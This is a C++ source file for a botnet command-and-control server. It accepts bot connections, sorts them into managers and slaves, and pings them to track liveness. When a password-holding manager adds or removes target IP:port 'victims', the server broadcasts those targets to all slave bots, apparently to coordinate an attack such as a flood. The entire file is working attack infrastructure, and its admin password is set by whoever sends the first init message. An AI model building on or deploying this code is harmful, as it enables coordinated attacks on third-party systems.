#include "server.h"

server::server(io::io_context& io_context, std::uint16_t port)
    : io_context_(io_context),
      acceptor_(io_context, tcp::endpoint(tcp::v4(), port)),
      interval_(INACTIVITY_TIMEOUT),
      timer_(io_context_, interval_) {
	command_handlers_ = {
	    {"[ARE_YOU_ALIVE]",
	     boost::bind(&server::handleAlive, this, boost::placeholders::_1, boost::placeholders::_2, boost::placeholders::_3)},
	    {"[INIT]",
	     boost::bind(&server::handleInit, this, boost::placeholders::_1, boost::placeholders::_2, boost::placeholders::_3)},
	    {"[GET_BOTS_DATA]", boost::bind(&server::handleGetClientsData, this, boost::placeholders::_1, boost::placeholders::_2,
					    boost::placeholders::_3)},
	    {"[GET_VICTIMS_DATA]", boost::bind(&server::handleGetVictimsData, this, boost::placeholders::_1,
					       boost::placeholders::_2, boost::placeholders::_3)},
	    {"[DEL_BOT]", boost::bind(&server::handleRemoveClient, this, boost::placeholders::_1, boost::placeholders::_2,
				      boost::placeholders::_3)},
	    {"[ADD_VICTIM]", boost::bind(&server::handleAddVictim, this, boost::placeholders::_1, boost::placeholders::_2,
					 boost::placeholders::_3)},
	    {"[DEL_VICTIM]", boost::bind(&server::handleRemoveVictim, this, boost::placeholders::_1, boost::placeholders::_2,
					 boost::placeholders::_3)},
	};
}

void server::start() {
	timer_.async_wait(boost::bind(&server::pingClients, this));
	accept();
}

void server::accept() {
	socket_.emplace(io_context_);

	acceptor_.async_accept(*socket_, [self = this](err error_code) { self->onAccept(error_code); });
}

void server::onAccept(err error_code) {
	int client_id = getClientId_();

	clients_sessions_container_.insert(
	    std::make_pair(client_id, std::make_unique<session>(std::move(*socket_), io_context_, client_id)));
	auto& client = clients_sessions_container_.find(client_id)->second;

	PRINT("New client connected", "");

	client->start(boost::bind(&server::handleResponse, this, boost::placeholders::_1, boost::placeholders::_2));
	accept();
}

void server::handleResponse(std::string& query, session* client) {
	PRINT(client->endpoint_, (": " + query));

	auto parsed_msg = msg_parser_.parse_msg(query);

	if (parsed_msg["is_valid_msg"][0] == "false") {
		PRINT("Invalid message", "");
		return;
	}
	if (command_handlers_.find(parsed_msg["command"][0]) == command_handlers_.end()) {
		PRINT("No handler for ", parsed_msg["command"][0]);
		return;
	};
	updateMsgCounter_(client);
	auto handler = command_handlers_.find(parsed_msg["command"][0])->second;
	if (handler) handler(parsed_msg["command"][0], parsed_msg["params"], client);
}

void server::handleAlive(std::string& command, std::vector<std::string>& params, session* client) {
	if (!params.size()) return;
	if (!isNumber_(params[0])) return;
	if (stoi(params[0])) client->inactive_timeout_count_ = 0;
}

void server::handleInit(std::string& command, std::vector<std::string>& params, session* client) {
	if (params.size()) {
		if (!checkHash_(params[0])) {
			std::hash<std::string> hasher;
			admin_hash_ = hasher(params[0]);
			PRINT(command, " was successfull!");
		}
	}

	if (clients_data_container_.find(client->ip_) != clients_data_container_.end()) {
		clients_data_container_[client->ip_].id = clients_sessions_container_.find(client->id_)->first;
		clients_data_container_[client->ip_].connected = getCurrentDateTime_();

		if (params.size() && checkHash_(params[0])) {
			clients_data_container_[client->ip_].status = "bot_manager";
		} else {
			clients_data_container_[client->ip_].status = "bot_slave";
		}
	}

	std::vector<std::string> output_params = {"1"};
	client->send(msg_parser_.genCommand(command, output_params));
}

void server::handleGetClientsData(std::string& command, std::vector<std::string>& params, session* client) {
	if (params.empty()) return;
	if (!checkHash_(params[0])) return;

	if (params.size() == 2) {
		if (stoi(params[1]) && bots_data_output_.size() > 0) {
			client->send(msg_parser_.genCommand(command, bots_data_output_.front()));
			bots_data_output_.pop();
			return;
		}
	}
	int bot_counter = 0;
	int current_msg_block = 0;

    // Clearing messages queue (for manager)
	std::queue<std::vector<std::string>> empty;
	std::swap(bots_data_output_, empty);

	std::vector<std::string> msg;
	std::vector<std::string> parameters = {"[IP-address]", "[Connected]", "[Messages]", "[Victims]", "[Role]"};

	int msg_blocks_num = std::ceil((float)clients_data_container_.size() / MAX_NUMBER_OF_BOTS_DATA_PER_MSG);

	for (auto& bot : clients_data_container_) {
		if (bot_counter >= MAX_NUMBER_OF_BOTS_DATA_PER_MSG || !bot_counter) {
			if (bot_counter) {
				bots_data_output_.emplace(std::move(msg));
				msg.clear();
			}
			bot_counter = 0;

			msg.push_back(std::to_string(current_msg_block + 1));
			msg.push_back(std::to_string(msg_blocks_num));
			msg.push_back(std::to_string(parameters.size()));

			msg.insert(msg.end(), parameters.begin(), parameters.end());

			++current_msg_block;
		}

		msg.push_back(bot.first);
		msg.push_back(bot.second.connected);
		msg.push_back(std::to_string(bot.second.msgs_from));
		msg.push_back(std::to_string(bot.second.victims));
		msg.push_back(bot.second.status);

		++bot_counter;
	}
	bots_data_output_.emplace(std::move(msg));

	client->send(msg_parser_.genCommand(command, bots_data_output_.front()));
	bots_data_output_.pop();
}

void server::handleGetVictimsData(std::string& command, std::vector<std::string>& params, session* client) {
	if (!params.size()) return;
	if (!checkHash_(params[0])) return;

	std::vector<std::string> output_params = {"1", "1", "1", "[Active_Victims]"};

	for (auto& victim : victims_ips_) {
		PRINT("VICTIMS: ", victim);
		output_params.push_back(victim);
	}
	PRINT("SENT: ", msg_parser_.genCommand(command, output_params));
	client->send(msg_parser_.genCommand(command, output_params));
}

void server::handleRemoveClient(std::string& command, std::vector<std::string>& params, session* client) {
	if (params.size() < 2) return;
	if (!checkHash_(params[0])) return;

	if (clients_data_container_.find(params[1]) == clients_data_container_.end()) {
		return;
	}

	auto ip = params[1];
	auto id = clients_data_container_.find(ip)->second.id;

	PRINT("REMOVING CLIENT: ", ip);
	if (clients_sessions_container_.find(id) != clients_sessions_container_.end()) {
		clients_sessions_container_.find(id)->second->stop();
		clients_sessions_container_.erase(id);
	}
	if (clients_data_container_.find(ip) != clients_data_container_.end()) {
		clients_data_container_.erase(ip);
	}
}

void server::handleRemoveVictim(std::string& command, std::vector<std::string>& params, session* client) {
	if (params.size() < 2) return;
	if (!checkHash_(params[0])) return;

	auto victim = params[1];
	PRINT("REMOVING VICTIM: ", victim);

	if (!std::count(victims_ips_.begin(), victims_ips_.end(), victim)) {
		return;
	}

	int client_id_for_min_victims = -1;
	std::string client_ip;

	for (const auto& cl : clients_data_container_) {
		if (cl.second.status == "bot_slave" && std::find(cl.second.victims_vector.begin(), cl.second.victims_vector.end(),
								 victim) != cl.second.victims_vector.end()) {
			client_id_for_min_victims = cl.second.id;
			client_ip = cl.first;

			std::vector<std::string> output_params = {victim};
			std::string comm = "[REMOVE_CLIENT_VICTIM]";
			auto client_id_for_min_victims_session =
			    clients_sessions_container_.find(client_id_for_min_victims)->second;
			client_id_for_min_victims_session->send(msg_parser_.genCommand(comm, output_params));

			// Update victim info
			clients_data_container_.find(client_ip)->second.victims--;

			victims_ips_.erase(std::remove(victims_ips_.begin(), victims_ips_.end(), victim), victims_ips_.end());
		}
	}

	clients_data_container_.find(client_ip)->second.victims_vector.erase(
	    std::remove(clients_data_container_.find(client_ip)->second.victims_vector.begin(),
			clients_data_container_.find(client_ip)->second.victims_vector.end(), victim),
	    clients_data_container_.find(client_ip)->second.victims_vector.end());
}

void server::handleAddVictim(std::string& command, std::vector<std::string>& params, session* client) {
	if (params.size() < 2) return;
	if (!checkHash_(params[0])) return;

	std::string victim_ip = params[1];

	PRINT("ADDING NEW VICTIM: ", victim_ip);

	if (validate_ip(victim_ip)) {
		int client_id_for_min_victims = -1;
		std::string client_ip;

		for (const auto& cl : clients_data_container_) {
			if (cl.second.status == "bot_slave") {
				client_id_for_min_victims = cl.second.id;
				client_ip = cl.first;

				std::vector<std::string> output_params = {victim_ip};
				std::string comm = "[ADD_CLIENT_VICTIM]";
				auto client_id_for_min_victims_session =
				    clients_sessions_container_.find(client_id_for_min_victims)->second;
				client_id_for_min_victims_session->send(msg_parser_.genCommand(comm, output_params));

				// Update victim info
				clients_data_container_.find(client_ip)->second.victims++;
				clients_data_container_.find(client_ip)->second.victims_vector.push_back(victim_ip);
			}
		}
		victims_ips_.push_back(victim_ip);

	} else {
		PRINT("WRONG VICTIM IP: ", victim_ip);
	}
}

void server::pingClients() {
	std::string command = "[ARE_YOU_ALIVE]";

	for (auto& client : clients_sessions_container_) {
		++client.second->inactive_timeout_count_;

		if (client.second->inactive_timeout_count_ >= INACTIVE_COUNTER_MAX) {
			PRINT("Disconnecting due to inactivity client:", client.second->ip_);
			if (!client.second->disconnected_) {
				client.second->stop();
			}

			clients_sessions_container_.erase(client.second->id_);
			if (clients_data_container_.find(client.second->ip_) != clients_data_container_.end()) {
				clients_data_container_.erase(client.second->ip_);
			}

		} else {
			if (clients_data_container_.find(client.second->ip_) == clients_data_container_.end()) {
				continue;
			}
			std::vector<std::string> output_params = {NONE_PARAMETERS};
			client.second->send(msg_parser_.genCommand(command, output_params));
		}
	}

	timer_.expires_at(timer_.expires_at() + interval_);
	timer_.async_wait(boost::bind(&server::pingClients, this));
}

int server::getClientId_() {
	std::random_device rd;
	std::mt19937::result_type seed = rd() ^ ((std::mt19937::result_type)std::chrono::duration_cast<std::chrono::seconds>(
						     std::chrono::system_clock::now().time_since_epoch())
						     .count() +
						 (std::mt19937::result_type)std::chrono::duration_cast<std::chrono::microseconds>(
						     std::chrono::high_resolution_clock::now().time_since_epoch())
						     .count());

	std::mt19937 gen(seed);
	std::uniform_int_distribution<unsigned> distrib(1, INT_MAX);

	int bot_id = (int)distrib(gen);
	while (clients_sessions_container_.find(bot_id) != clients_sessions_container_.end()) {
		bot_id = (int)distrib(gen);
	}
	return bot_id;
}

bool server::checkHash_(std::string& pass) {
	if (pass.empty()) return false;
	std::hash<std::string> hasher;
	return hasher(pass) == admin_hash_;
}

const std::string server::getCurrentDateTime_() {
	time_t now = time(0);
	struct tm tstruct;
	char buf[80];
	tstruct = *localtime(&now);
	strftime(buf, sizeof(buf), "%Y-%m-%d.%X", &tstruct);
	return buf;
}

void server::updateMsgCounter_(session* client) { ++clients_data_container_[client->ip_].msgs_from; }

bool server::isNumber_(const std::string& s) { return !s.empty() && std::all_of(s.begin(), s.end(), ::isdigit); }

bool server::validate_ip(std::string ip_string) {
	try {
		std::vector<std::string> victim_ip_port_split;
		boost::split(victim_ip_port_split, ip_string, boost::is_any_of(":"), boost::token_compress_on);
		std::vector<std::string> ip_tokens;
		boost::split(ip_tokens, victim_ip_port_split[0], boost::is_any_of("."), boost::token_compress_on);

		if (victim_ip_port_split[1].size() == 0 || stoi(victim_ip_port_split[1]) < 0 ||
		    stoi(victim_ip_port_split[1]) > 65536) {
			return false;
		}

		if (ip_tokens.size() != 4) {
			return false;
		}

		for (const std::string& token : ip_tokens) {
			if (token.size() > 3) {
				return false;
			}
			if (!isNumber_(token) || stoi(token) > 255 || stoi(token) < 0) {
				return false;
			}
		}
	} catch (err) {
		return false;
	}

	return true;
}
